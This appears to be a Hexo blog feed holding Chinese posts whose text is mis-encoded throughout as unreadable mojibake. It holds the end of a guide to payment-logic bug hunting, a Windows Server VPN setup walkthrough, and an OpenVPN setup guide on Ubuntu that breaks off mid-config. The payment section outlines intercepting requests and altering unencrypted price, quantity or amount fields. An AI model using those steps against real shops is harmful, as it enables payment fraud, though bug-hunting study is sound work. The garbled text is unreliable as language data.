æ­£è´Ÿé€»è¾‘ï¼šä¿®æ”¹æ•°é‡"></a>2. æ­£è´Ÿé€»è¾‘ï¼šä¿®æ”¹æ•°é‡</h4><p><strong>ä¾‹3ï¼š</strong></p><p>ç¬¬ä¸€æ­¥ï¼šæ˜ç¡®æ”¯ä»˜ç‚¹ï¼šè´­ä¹°å•†å“</p><p>ç¬¬äºŒæ­¥ï¼šå¯»æ‰¾å…³é”®å¯æ§å˜é‡ï¼ˆå¸çš„æ•°é‡ï¼‰</p><ul><li>å…³é”®å˜é‡ï¼šä»·æ ¼å˜é‡ï¼ˆå˜é‡æœªåŠ å¯†ï¼‰</li></ul><p>ç¬¬ä¸‰æ­¥ï¼šæŠ“åŒ…æ”¾åŒ…å¯¹æ¯”</p><p>æ›´æ”¹ä»·æ ¼ï¼ˆå¸çš„æ•°é‡ï¼‰</p><p><strong>ä¾‹4ï¼š</strong></p><p>ç¬¬ä¸€æ­¥ï¼šæ˜ç¡®æ”¯ä»˜ç‚¹ï¼šç§¯åˆ†æ¢å¸</p><p>ç¬¬äºŒæ­¥ï¼šå¯»æ‰¾å…³é”®å¯æ§å˜é‡</p><ul><li>å…³é”®å˜é‡ï¼šå¸æ•°é‡ï¼ˆå˜é‡æœªåŠ å¯†ï¼‰</li></ul><p>ç¬¬ä¸‰æ­¥ï¼šæŠ“åŒ…æ”¾åŒ…å¯¹æ¯”</p><p>æ›´æ”¹å¸çš„æ•°é‡</p><h4 id="3-æ­£è´Ÿé€»è¾‘ï¼šæ”¯ä»˜ä»·æ ¼å˜åŠ¨"><a href="#3-æ­£è´Ÿé€»è¾‘ï¼šæ”¯ä»˜ä»·æ ¼å˜åŠ¨" class="headerlink" title="3. æ­£è´Ÿé€»è¾‘ï¼šæ”¯ä»˜ä»·æ ¼å˜åŠ¨"></a>3. æ­£è´Ÿé€»è¾‘ï¼šæ”¯ä»˜ä»·æ ¼å˜åŠ¨</h4><p><strong>ä¾‹5ï¼š</strong></p><p>ç¬¬ä¸€æ­¥ï¼šæ˜ç¡®æ”¯ä»˜ç‚¹ï¼šè´­ç‰©</p><p>ç¬¬äºŒæ­¥ï¼šå¯»æ‰¾å…³é”®å¯æ§å˜é‡</p><ul><li>å…³é”®å˜é‡ï¼šä»·æ ¼å˜é‡ï¼ˆå˜é‡æœªåŠ å¯†ï¼‰</li></ul><p>ç¬¬ä¸‰æ­¥ï¼šæŠ“åŒ…æ”¾åŒ…å¯¹æ¯”</p><p>æ›´æ”¹Priceå¯å¢åŠ ä½™é¢</p><h4 id="4-æ­£è´Ÿé€»è¾‘ï¼šä¿®æ”¹é™„å±å€¼"><a href="#4-æ­£è´Ÿé€»è¾‘ï¼šä¿®æ”¹é™„å±å€¼" class="headerlink" title="4. æ­£è´Ÿé€»è¾‘ï¼šä¿®æ”¹é™„å±å€¼"></a>4. æ­£è´Ÿé€»è¾‘ï¼šä¿®æ”¹é™„å±å€¼</h4><p><strong>ä¾‹6ï¼š</strong></p><p>ç¬¬ä¸€æ­¥ï¼šæ˜ç¡®æ”¯ä»˜ç‚¹ï¼šå…‘æ¢ç‰©å“ï¼ˆç§¯åˆ†+é‡‘é¢æ¨¡å¼ä»˜æ¬¾ï¼‰</p><p>ç¬¬äºŒæ­¥ï¼šå¯»æ‰¾å…³é”®å¯æ§å˜é‡</p><ul><li>å…³é”®å˜é‡ï¼šé‡‘é¢å˜é‡ï¼ˆå˜é‡æœªåŠ å¯†ï¼‰</li></ul><p>ç¬¬ä¸‰æ­¥ï¼šæŠ“åŒ…æ”¾åŒ…å¯¹æ¯”</p><p>é‡‘é¢å˜é‡å˜åŒ–ï¼Œæœ€ç»ˆæ”¯ä»˜ä»·æ ¼ä¹Ÿä¼šå˜åŒ–</p><h4 id="5-0-01æ¨¡å¼"><a href="#5-0-01æ¨¡å¼" class="headerlink" title="5. 0.01æ¨¡å¼"></a>5. 0.01æ¨¡å¼</h4><p>0.01æ¨¡å¼ï¼šé€»è¾‘åˆ¤æ–­ä»·æ ¼ä¸èƒ½ä¸ºè´Ÿæ•°</p><p><strong>ä¾‹7ï¼š</strong></p><p>ç¬¬ä¸€æ­¥ï¼šæ˜ç¡®æ”¯ä»˜ç‚¹ï¼šè´­ä¹°ä¿é™©</p><p>ç¬¬äºŒæ­¥ï¼šå¯»æ‰¾å…³é”®å¯æ§å˜é‡</p><ul><li>å…³é”®å˜é‡ï¼šé‡‘é¢å˜é‡ï¼ˆä¸€ä¸ªæˆ–å¤šä¸ªï¼‰ï¼ˆå˜é‡æœªåŠ å¯†ï¼‰</li></ul><p>ç¬¬ä¸‰æ­¥ï¼šæŠ“åŒ…æ”¾åŒ…å¯¹æ¯”</p><p>é‡‘é¢å˜é‡å˜åŒ–ï¼Œæœ€ç»ˆæ”¯ä»˜ä»·æ ¼ä¹Ÿä¼šå˜åŒ–</p><p>### </p><h2 id="äº”ã€æ”¯ä»˜æ¼æ´ä¿®å¤å»ºè®®"><a href="#äº”ã€æ”¯ä»˜æ¼æ´ä¿®å¤å»ºè®®" class="headerlink" title="äº”ã€æ”¯ä»˜æ¼æ´ä¿®å¤å»ºè®®"></a>äº”ã€æ”¯ä»˜æ¼æ´ä¿®å¤å»ºè®®</h2><p><img src="/2019/04/07/é€»è¾‘æ¼æ´æŒ–æ˜æ€è·¯-æ”¯ä»˜é€»è¾‘/1554557520785.png" alt="1554557520785"></p><h2 id="å…­ã€æ¼æ´æŠ¥å‘Š"><a href="#å…­ã€æ¼æ´æŠ¥å‘Š" class="headerlink" title="å…­ã€æ¼æ´æŠ¥å‘Š"></a>å…­ã€æ¼æ´æŠ¥å‘Š</h2><p>æ¼æ´æŠ¥å‘Šæœ€å¥½å…·æœ‰è§„èŒƒæ€§</p><p><strong>ä¸€èˆ¬å†…å®¹</strong>ï¼š</p><ul><li><p>æ¼æ´æ ‡é¢˜</p></li><li><p>æ¼æ´ç­‰çº§</p></li><li><p>æ¼æ´å½±å“èŒƒå›´</p></li><li><p>æ¼æ´è¯æ˜ä¿¡æ¯</p></li><li><p>æ¼æ´ä¿®å¤å»ºè®®</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯æ–‡ç«  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¸šåŠ¡é€»è¾‘æ¼æ´ </tag>
            
            <tag> æ”¯ä»˜é€»è¾‘æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 2008 R2 æ­å»ºVPNæœåŠ¡</title>
      <link href="/2019/04/07/Windows-2008-R2-%E6%90%AD%E5%BB%BAVPN%E6%9C%8D%E5%8A%A1/"/>
      <url>/2019/04/07/Windows-2008-R2-%E6%90%AD%E5%BB%BAVPN%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€ä»‹ç»"><a href="#ä¸€ã€ä»‹ç»" class="headerlink" title="ä¸€ã€ä»‹ç»"></a>ä¸€ã€ä»‹ç»</h1><p>â€‹    è™šæ‹Ÿç§äººç½‘ç»œï¼ˆVirtual Private Networkï¼Œç¼©å†™ä¸ºVPNï¼‰æ˜¯ä¸€ç§å¸¸ç”¨äºè¿æ¥ä¸­ã€å¤§å‹ä¼ä¸šæˆ–å›¢ä½“ä¸å›¢ä½“é—´çš„ç§äººç½‘ç»œçš„é€šè®¯æ–¹æ³•ã€‚å®ƒåˆ©ç”¨éš§é“åè®®ï¼ˆTunneling Protocolï¼‰æ¥è¾¾åˆ°ä¿å¯†ã€å‘é€ç«¯è®¤è¯ã€æ¶ˆæ¯å‡†ç¡®æ€§ç­‰ç§äººæ¶ˆæ¯å®‰å…¨æ•ˆæœï¼Œè¿™ç§æŠ€æœ¯å¯ä»¥ç”¨ä¸å®‰å…¨çš„ç½‘ç»œï¼ˆä¾‹å¦‚ï¼šäº’è”ç½‘ï¼‰æ¥å‘é€å¯é ã€å®‰å…¨çš„æ¶ˆæ¯ã€‚</p><pre><code>é€šå¸¸æƒ…å†µä¸‹ï¼ŒVPNç½‘å…³é‡‡å–åŒç½‘å¡ç»“æ„ï¼Œå¤–ç½‘å¡ä½¿ç”¨å…¬ç½‘IPæ¥å…¥Internetã€‚</code></pre> <a id="more"></a><h1 id="äºŒã€æ­å»ºæ­¥éª¤"><a href="#äºŒã€æ­å»ºæ­¥éª¤" class="headerlink" title="äºŒã€æ­å»ºæ­¥éª¤"></a>äºŒã€æ­å»ºæ­¥éª¤</h1><ol><li>å®‰è£…VPNæœåŠ¡ï¼Œæ‰“å¼€æœåŠ¡å™¨ç®¡ç†å™¨-æ·»åŠ è§’è‰²</li></ol><p><img src="/2019/04/07/Windows-2008-R2-æ­å»ºVPNæœåŠ¡/wps1.jpg" alt="img"> </p><ol start="2"><li>ç‚¹å‡»æ·»åŠ è§’è‰²ï¼Œä¸‹ä¸€æ­¥ï¼Œå‹¾é€‰ç½‘ç»œç­–ç•¥å’Œè®¿é—®æœåŠ¡ï¼Œä¸‹ä¸€æ­¥æ˜¯ç½‘ç»œç­–ç•¥è®¿é—®çš„ç®€ä»‹</li></ol><p><img src="/2019/04/07/Windows-2008-R2-æ­å»ºVPNæœåŠ¡/wps2.jpg" alt="img"> </p><ol start="3"><li>å‹¾é€‰ç½‘ç»œç­–ç•¥æœåŠ¡å™¨ï¼Œå’Œè·¯ç”±è®¿é—®ï¼Œç„¶åä¸‹ä¸€æ­¥ï¼Œç»§ç»­å®‰è£…</li></ol><p><img src="/2019/04/07/Windows-2008-R2-æ­å»ºVPNæœåŠ¡/wps3.jpg" alt="img"> </p><ol start="4"><li>å®‰è£…å®Œæˆ</li></ol><p><img src="/2019/04/07/Windows-2008-R2-æ­å»ºVPNæœåŠ¡/wps4.jpg" alt="img"> </p><ol start="5"><li>å®‰è£…å®Œæˆä¹‹åï¼Œåœ¨æœåŠ¡å™¨ç®¡ç†å™¨ä¸­æ‰¾åˆ°è·¯ç”±å’Œè¿œç¨‹è®¿é—®ï¼Œå¹¶ä¸”è¿›è¡Œé…ç½®</li></ol><p><img src="/2019/04/07/Windows-2008-R2-æ­å»ºVPNæœåŠ¡/wps5.jpg" alt="img"> </p><ol start="6"><li>é…ç½®ç‚¹å‡»ä¸‹ä¸€æ­¥ï¼Œé€‰æ‹©è‡ªå®šä¹‰é…ç½®</li></ol><p><img src="/2019/04/07/Windows-2008-R2-æ­å»ºVPNæœåŠ¡/wps6.jpg" alt="img"> </p><ol start="7"><li>ç„¶åä¸‹ä¸€æ­¥å‹¾é€‰VPNè®¿é—®ï¼Œç‚¹å‡»å®Œæˆå³å¯ï¼</li></ol><p><img src="/2019/04/07/Windows-2008-R2-æ­å»ºVPNæœåŠ¡/wps7.jpg" alt="img"> </p><p><img src="/2019/04/07/Windows-2008-R2-æ­å»ºVPNæœåŠ¡/wps8.jpg" alt="img"> </p><ol start="8"><li>å®Œæˆä¹‹åéœ€è¦å¯åŠ¨è·¯ç”±å’Œè¿œç¨‹è®¿é—®åŠŸèƒ½</li></ol><p><img src="/2019/04/07/Windows-2008-R2-æ­å»ºVPNæœåŠ¡/wps9.jpg" alt="img"> </p><ol start="9"><li>å®‰è£…å®Œæˆä¹‹åï¼Œå¼€å§‹é…ç½®VPNï¼Œæ‰¾åˆ°è·¯ç”±å’Œè¿œç¨‹è®¿é—®ï¼ŒIPV4å±•å¼€ä¹‹åï¼Œå‡ºç°å¸¸è§„ï¼Œé€‰ä¸­å¸¸è§„å³é”®æ–°å¢è·¯ç”±åè®®</li></ol><p><img src="/2019/04/07/Windows-2008-R2-æ­å»ºVPNæœåŠ¡/wps10.jpg" alt="img"> </p><ol start="10"><li>åœ¨æ·»åŠ çš„è·¯ç”±åè®®ä¸­ï¼Œé€‰æ‹©NATè·¯ç”±åè®®ã€‚</li></ol><p><img src="/2019/04/07/Windows-2008-R2-æ­å»ºVPNæœåŠ¡/wps11.jpg" alt="img"> </p><ol start="11"><li>ä¸Šæ­¥é€‰æ‹©äº†NATï¼Œç°åœ¨é…ç½®NATï¼Œåœ¨NATä¸Šå³é”®æ–°å¢æ¥å£</li></ol><p><img src="/2019/04/07/Windows-2008-R2-æ­å»ºVPNæœåŠ¡/wps12.jpg" alt="img"> </p><ol start="12"><li>ç„¶åæŠŠâ€œå†…éƒ¨â€æ¥å£ä¹Ÿæ·»åŠ ä¸Šï¼Œå¹¶â€œå³é”®â€â€”â€”â€å±æ€§â€œå¦‚ä¸‹è®¾ç½®ï¼š</li></ol><p><img src="/2019/04/07/Windows-2008-R2-æ­å»ºVPNæœåŠ¡/wps13.jpg" alt="img"> </p><p><img src="/2019/04/07/Windows-2008-R2-æ­å»ºVPNæœåŠ¡/wps14.jpg" alt="img"> </p><ol start="13"><li>åˆ›å»ºVPNå¸å·ï¼Œæµ‹è¯•VPNæœåŠ¡å™¨æ˜¯å¦æ­£å¸¸ã€‚åœ¨è®¡ç®—æœºå³é”®ç®¡ç†ï¼Œé€‰æ‹©é…ç½®ï¼Œæœ¬åœ°ç”¨æˆ·å’Œç»„ï¼Œè¿˜è¦æŠŠæ‹¨å…¥å±æ€§é€‰é¡¹å¡ä¸­çš„ç½‘ç»œè®¿é—®æƒé™é€‰æ‹©ä¸º å…è®¸è®¿é—®ã€‚</li></ol><p><img src="/2019/04/07/Windows-2008-R2-æ­å»ºVPNæœåŠ¡/wps15.jpg" alt="img"> </p><ol start="14"><li>è‡³æ­¤ï¼Œå®Œæˆäº†VPNæœåŠ¡å™¨ç«¯çš„é…ç½®</li></ol><h1 id="ä¸‰ã€è¿æ¥æµ‹è¯•"><a href="#ä¸‰ã€è¿æ¥æµ‹è¯•" class="headerlink" title="ä¸‰ã€è¿æ¥æµ‹è¯•"></a>ä¸‰ã€è¿æ¥æµ‹è¯•</h1><p>â€‹    ä½¿ç”¨å¦å¤–ä¸€å°ä¸åŒç½‘æ®µçš„æœºå™¨ï¼Œæ–°å»ºVPNæ‹¨å·è¿æ¥ï¼Œç™»å½•VPNæœåŠ¡å™¨ä¸Šçš„æµ‹è¯•å¸å·</p><ol><li>é…ç½®è¿æ¥å±æ€§</li></ol><p><img src="/2019/04/07/Windows-2008-R2-æ­å»ºVPNæœåŠ¡/wps16.jpg" alt="img"> </p><ol start="2"><li>å¼€å§‹è¿æ¥ </li></ol><p><img src="/2019/04/07/Windows-2008-R2-æ­å»ºVPNæœåŠ¡/wps17.jpg" alt="img"> </p><ol start="3"><li>è¿æ¥æˆåŠŸ </li></ol><p><img src="/2019/04/07/Windows-2008-R2-æ­å»ºVPNæœåŠ¡/wps18.jpg" alt="img"> </p><ol start="4"><li>æŸ¥çœ‹IP </li></ol><p><img src="/2019/04/07/Windows-2008-R2-æ­å»ºVPNæœåŠ¡/wps19.jpg" alt="img"> </p><ol start="5"><li>æœ¬æœºIP </li></ol><p><img src="/2019/04/07/Windows-2008-R2-æ­å»ºVPNæœåŠ¡/wps20.jpg" alt="img"> </p><p>è‡³æ­¤ï¼Œå®Œæˆäº†VPNå®¢æˆ·ç«¯çš„è¿æ¥</p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows Server </tag>
            
            <tag> OpenVPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu16æ­å»ºOpenVPNæœåŠ¡</title>
      <link href="/2019/04/07/Ubuntu16%E4%B8%8B%E6%90%AD%E5%BB%BAOpenVPN%E6%9C%8D%E5%8A%A1/"/>
      <url>/2019/04/07/Ubuntu16%E4%B8%8B%E6%90%AD%E5%BB%BAOpenVPN%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€å‚è€ƒ"><a href="#ä¸€ã€å‚è€ƒ" class="headerlink" title="ä¸€ã€å‚è€ƒ"></a>ä¸€ã€å‚è€ƒ</h2><p><a href="https://blog.csdn.net/u012843189/article/details/77422505" target="_blank" rel="noopener">Ubuntu16.04æ­å»ºOpenVPN</a><br><a href="https://cndaqiang.github.io/2017/09/27/ubuntu1604-openvpn/" target="_blank" rel="noopener">Ubuntu16.04æ­å»ºopenvpnæœåŠ¡å™¨</a></p><h2 id="äºŒã€ç¯å¢ƒ"><a href="#äºŒã€ç¯å¢ƒ" class="headerlink" title="äºŒã€ç¯å¢ƒ"></a>äºŒã€ç¯å¢ƒ</h2><p>Ubuntu 16.10 yakkety (GNU/Linux 4.8.0-22-generic x86_64)</p><h2 id="ä¸‰ã€ä»‹ç»"><a href="#ä¸‰ã€ä»‹ç»" class="headerlink" title="ä¸‰ã€ä»‹ç»"></a>ä¸‰ã€ä»‹ç»</h2><p><strong>VPN</strong>ï¼ˆVirtual Private Networkï¼Œè™šæ‹Ÿç§äººç½‘ç»œï¼‰æ˜¯ä¸€ç§å¸¸ç”¨äºè¿æ¥ä¸­ã€å¤§å‹ä¼ä¸šæˆ–å›¢ä½“ä¸å›¢ä½“é—´çš„ç§äººç½‘ç»œçš„é€šè®¯æ–¹æ³•ã€‚å®ƒåˆ©ç”¨<a href="https://zh.wikipedia.org/wiki/%E9%9A%A7%E9%81%93%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">éš§é“åè®®</a>ï¼ˆTunneling Protocolï¼‰æ¥è¾¾åˆ°ä¿å¯†ã€å‘é€ç«¯è®¤è¯ã€æ¶ˆæ¯å‡†ç¡®æ€§ç­‰ç§äººæ¶ˆæ¯å®‰å…¨æ•ˆæœï¼Œè¿™ç§æŠ€æœ¯å¯ä»¥ç”¨ä¸å®‰å…¨çš„ç½‘ç»œï¼ˆä¾‹å¦‚ï¼šäº’è”ç½‘ï¼‰æ¥å‘é€å¯é ã€å®‰å…¨çš„æ¶ˆæ¯ã€‚</p><h2 id="å››ã€å®‰è£…"><a href="#å››ã€å®‰è£…" class="headerlink" title="å››ã€å®‰è£…"></a>å››ã€å®‰è£…</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install openvpn easy-rsa</span><br></pre></td></tr></table></figure><a id="more"></a><p><code>easy-rsa</code>å†…éƒ¨CAï¼ˆcertificate authorityï¼‰è¯ä¹¦ç”Ÿæˆè½¯ä»¶</p><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554386400868.png" alt="1554386400868"></p><h2 id="äº”ã€è¯ä¹¦åˆ¶ä½œ"><a href="#äº”ã€è¯ä¹¦åˆ¶ä½œ" class="headerlink" title="äº”ã€è¯ä¹¦åˆ¶ä½œ"></a>äº”ã€è¯ä¹¦åˆ¶ä½œ</h2><h3 id="1-è¯ä¹¦é…ç½®"><a href="#1-è¯ä¹¦é…ç½®" class="headerlink" title="1. è¯ä¹¦é…ç½®"></a>1. è¯ä¹¦é…ç½®</h3><p>å¤åˆ¶è¯ä¹¦åˆ¶ä½œå·¥å…·åˆ°æ–‡ä»¶å¤¹(è¯¥æ–‡ä»¶å¤¹åº”è¯¥ä¸å­˜åœ¨ï¼Œå¤åˆ¶åè‡ªåŠ¨åˆ›å»ºè¯¥æ–‡ä»¶å¤¹)ï¼Œ<code>make-cadir</code>ä¸ºeasy-rsaå®‰è£…åå¢åŠ çš„å‘½ä»¤ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make-cadir /etc/openvpn/ca</span><br><span class="line">cd /etc/openvpn/ca</span><br></pre></td></tr></table></figure><p>æ›´æ”¹è¯ä¹¦é»˜è®¤è®¾ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim vars</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹å†…å®¹ä¸ºè¯ä¹¦çš„é»˜è®¤å†…å®¹ï¼Œå¯è‡ªå®šä¹‰ï¼Œä¸èƒ½ä¸ºç©º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">export KEY_COUNTRY=&quot;US&quot;</span><br><span class="line">export KEY_PROVINCE=&quot;CA&quot;</span><br><span class="line">export KEY_CITY=&quot;SanFrancisco&quot;</span><br><span class="line">export KEY_ORG=&quot;Fort-Funston&quot;</span><br><span class="line">export KEY_EMAIL=&quot;me@myhost.mydomain&quot;</span><br><span class="line">export KEY_OU=&quot;MyOrganizationalUnit&quot;</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554386592562.png" alt="1554386592562"></p><p>ä¸‹é¢æœ‰ä¸ªKEY_NAMEï¼Œå€¼å¯è‡ªå®šä¹‰ï¼Œä¾‹å¦‚heiheihei</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KEY_NAME=&quot;heiheihei&quot;</span><br></pre></td></tr></table></figure><p>ä¿å­˜é€€å‡º</p><p>ç°åœ¨å¯ä»¥ä½¿ç”¨åˆšæ‰è®¾ç½®çš„å˜é‡ï¼Œç”¨easy-rsaåŒ…æ¥åˆ¶ä½œCAã€‚ç¡®ä¿åœ¨CAç›®å½•ä¸‹é¢ï¼Œç„¶åsourceç¼–è¾‘è¿‡çš„varsæ–‡ä»¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source vars</span><br></pre></td></tr></table></figure><p>å¦‚æœsourceæ­£ç¡®çš„è¯ï¼Œä¼šçœ‹åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NOTE: If you run ./clean-all, I will be doing a rm -rf on /etc/openvpn/ca/keys</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554386666693.png" alt="1554386666693"></p><h3 id="2-CAè¯ä¹¦"><a href="#2-CAè¯ä¹¦" class="headerlink" title="2. CAè¯ä¹¦"></a>2. CAè¯ä¹¦</h3><p>CAæ•°å­—è¯ä¹¦è®¤è¯æœºæ„,è´Ÿè´£é¢å‘è¯ä¹¦ï¼Œç”¨äºopenvpnæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯çš„è®¤è¯</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./clean-all//ç¡®ä¿æˆ‘ä»¬çš„æ“ä½œå¤„äºä¸€ä¸ªcleanç¯å¢ƒä¸­</span><br><span class="line">./build-ca//ä¹‹åéœ€è¦ä¸€ç›´å›è½¦ç¡®è®¤</span><br><span class="line">./build-ca [--batch]//ä¿æŒé»˜è®¤è®¾ç½®ï¼Œæ— é¡»å›è½¦ç¡®è®¤</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554387418885.png" alt="1554387418885"></p><h3 id="3-æœåŠ¡å™¨è¯ä¹¦"><a href="#3-æœåŠ¡å™¨è¯ä¹¦" class="headerlink" title="3. æœåŠ¡å™¨è¯ä¹¦"></a>3. æœåŠ¡å™¨è¯ä¹¦</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build-key-server --batch heiheihei</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554429618321.png" alt="1554429618321"></p><p>heiheiheiä¸ºä¹‹å‰varsé‡Œ<code>export KEY_NAME=&quot;heiheihei&quot;</code>çš„å€¼ï¼Œè‡ªå®šä¹‰åï¼Œåé¢éœ€è¦ä¿®æ”¹æœåŠ¡å™¨é…ç½®æ–‡ä»¶ä¸­ç›¸åº”å†…å®¹ã€‚</p><p>clientåç§°ä¹Ÿå¯è‡ªå®šä¹‰,å¦‚æœä¿®æ”¹ï¼Œæœ€ååœ¨å®¢æˆ·ç«¯é…ç½®æ–‡ä»¶ä¸­ï¼Œä¹Ÿæ›´æ”¹å¯¹åº”åç§°ã€‚</p><h3 id="4-åˆ¶ä½œDiffie-Hellman-key"><a href="#4-åˆ¶ä½œDiffie-Hellman-key" class="headerlink" title="4. åˆ¶ä½œDiffie-Hellman key"></a>4. åˆ¶ä½œDiffie-Hellman key</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build-dh</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554429922860.png" alt="1554429922860"></p><p>ç­‰å¾…å‡ åˆ†é’Ÿæ—¶é—´å®Œæˆ</p><h3 id="5-ç”ŸæˆHMACç­¾ååŠ å¼ºTLSè®¤è¯"><a href="#5-ç”ŸæˆHMACç­¾ååŠ å¼ºTLSè®¤è¯" class="headerlink" title="5. ç”ŸæˆHMACç­¾ååŠ å¼ºTLSè®¤è¯"></a>5. ç”ŸæˆHMACç­¾ååŠ å¼ºTLSè®¤è¯</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openvpn --genkey --secret keys/ta.key</span><br></pre></td></tr></table></figure><h3 id="6-å®¢æˆ·ç«¯è¯ä¹¦"><a href="#6-å®¢æˆ·ç«¯è¯ä¹¦" class="headerlink" title="6. å®¢æˆ·ç«¯è¯ä¹¦"></a>6. å®¢æˆ·ç«¯è¯ä¹¦</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build-key --batch client</span><br></pre></td></tr></table></figure><p>clientåç§°å¯è‡ªå®šä¹‰,å¦‚æœä¿®æ”¹éœ€è¦åé¢åœ¨å®¢æˆ·ç«¯é…ç½®æ–‡ä»¶ä¸­ï¼Œæ›´æ”¹å¯¹åº”å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cert client.crt</span><br><span class="line">key client.key</span><br></pre></td></tr></table></figure><h2 id="å…­ã€æœåŠ¡ç«¯é…ç½®"><a href="#å…­ã€æœåŠ¡ç«¯é…ç½®" class="headerlink" title="å…­ã€æœåŠ¡ç«¯é…ç½®"></a>å…­ã€æœåŠ¡ç«¯é…ç½®</h2><h3 id="1-ç§»åŠ¨è¯ä¹¦"><a href="#1-ç§»åŠ¨è¯ä¹¦" class="headerlink" title="1. ç§»åŠ¨è¯ä¹¦"></a>1. ç§»åŠ¨è¯ä¹¦</h3><p>è¿›å…¥keysç›®å½•å¯ä»¥çœ‹åˆ°ç”Ÿæˆçš„è¯ä¹¦æ–‡ä»¶ æˆ‘ä»¬éœ€è¦<strong>ca.crt ca.key heiheihei.crt heiheihei.key ta.key dh2048.pem</strong> ï¼Œheiheiheiä¸ºä¹‹å‰è‡ªå®šä¹‰çš„æœåŠ¡å™¨è¯ä¹¦å</p><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554430607611.png" alt="1554430607611"></p><p>å¤åˆ¶è¯ä¹¦æ–‡ä»¶åˆ°/etc/openvpn å½“å‰ç›®å½•æ˜¯<code>/etc/openvpn/ca/keys</code>ï¼Œæ‰€ä»¥<code>../../</code>å°±æ˜¯é…ç½®ç›®å½•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ca.crt ca.key uuu.crt uuu.key ta.key dh2048.pem ../../</span><br></pre></td></tr></table></figure><h3 id="2-ä¿®æ”¹é…ç½®æ–‡ä»¶"><a href="#2-ä¿®æ”¹é…ç½®æ–‡ä»¶" class="headerlink" title="2. ä¿®æ”¹é…ç½®æ–‡ä»¶"></a>2. ä¿®æ”¹é…ç½®æ–‡ä»¶</h3><p>å¤åˆ¶é…ç½®æ–‡ä»¶æ¨¡æ¿åˆ°<code>/etc/openvpn/</code>,è§£å‹åä¿®æ”¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz .</span><br><span class="line">gzip -d server.conf.gz</span><br><span class="line">sudo vim server.conf</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹å†…å®¹æ›¿æ¢ä¸ºè¯ä¹¦çš„è·¯å¾„åç§°ï¼ŒåŒè·¯å¾„ä¸‹å¯ç›´æ¥å†™åç§°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ca ca.crt</span><br><span class="line">cert server.crt</span><br><span class="line">key server.key </span><br><span class="line"></span><br><span class="line">dh dh2048.pem</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘æ›¿æ¢æˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ca ca.crt</span><br><span class="line">cert heiheihei.crt</span><br><span class="line">key heiheihei.key</span><br><span class="line"></span><br><span class="line">dh 